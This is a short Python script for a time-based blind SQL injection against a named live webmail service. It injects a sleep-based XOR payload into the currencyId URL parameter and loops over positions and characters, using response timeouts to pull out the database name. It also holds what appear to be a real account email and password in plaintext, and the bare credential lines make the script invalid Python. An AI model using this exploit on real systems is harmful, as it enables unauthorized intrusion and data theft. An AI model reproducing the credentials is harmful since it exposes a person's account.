import requests

mail:13773049191@139.com
pwd:bjc006

url = '''https://mail.139.com/index.html?banner=1&country=AF&'''
url += '''currencyId=/*'XOR(if(%d=ascii(mid(database(),%d,1)),sleep(3),0))OR'"XOR(if(now()=sysdate(),sleep(6),0))OR"*/'''
url += '''&current=1&pageNo=1&payMethodCodes=ALIPAY&tradeType=buy'''

for j in range(1,16):
    for i in range(32,129,1):
        try:
            response = requests.get(url%(i,j), timeout=3)
        except Exception as e:
            print(chr(i))
